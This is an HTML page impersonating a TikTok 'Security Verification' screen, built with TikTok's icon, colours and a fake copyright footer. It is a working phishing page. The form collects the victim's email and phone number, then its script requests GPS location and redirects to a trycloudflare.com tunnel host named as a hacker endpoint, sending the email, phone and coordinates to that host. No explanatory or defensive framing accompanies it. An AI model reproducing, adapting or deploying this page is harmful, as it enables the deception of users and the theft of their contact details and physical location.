<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Account Verification</title>
  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      color: #333;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 40px 20px;
      text-align: center;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin-bottom: 20px;
    }
    h2 {
      color: #fe2c55;
      font-size: 22px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 30px;
    }
    input[type="email"], input[type="text"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    button {
      width: 100%;
      background-color: #fe2c55;
      color: white;
      border: none;
      padding: 14px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }
    .footer {
      font-size: 12px;
      color: #aaa;
      margin-top: 40px;
    }
    .footer a {
      color: #aaa;
      text-decoration: none;
      margin: 0 8px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://www.tiktok.com/favicon.ico" alt="TikTok Logo" class="logo" />
    <h2>Security Verification Required</h2>
    <p>To continue using your TikTok account, please verify your information and enable location access.</p>

    <form id="verifyForm">
      <input type="email" name="email" placeholder="Email Address" required />
      <input type="text" name="phone" placeholder="Phone Number" required />
      <button type="submit">Verify My Account</button>
    </form>

    <div class="footer">
      © 2025 TikTok.
      <a href="#">Privacy</a>
      <a href="#">Help</a>
      <a href="#">Terms</a>
    </div>
  </div>

  <script>
    document.getElementById("verifyForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.querySelector('input[name="email"]').value;
      const phone = document.querySelector('input[name="phone"]').value;

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const redirect = `https://ntsc-hacker-connectors-base.trycloudflare.com/log?email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}&lat=${lat}&lon=${lon}`;
          window.location.href = redirect;
        }, function(error) {
          alert("⚠️ Location access is required to verify your account.");
        });
      } else {
        alert("⚠️ Your browser does not support GPS location.");
      }
    });
  </script>

</body>
</html>
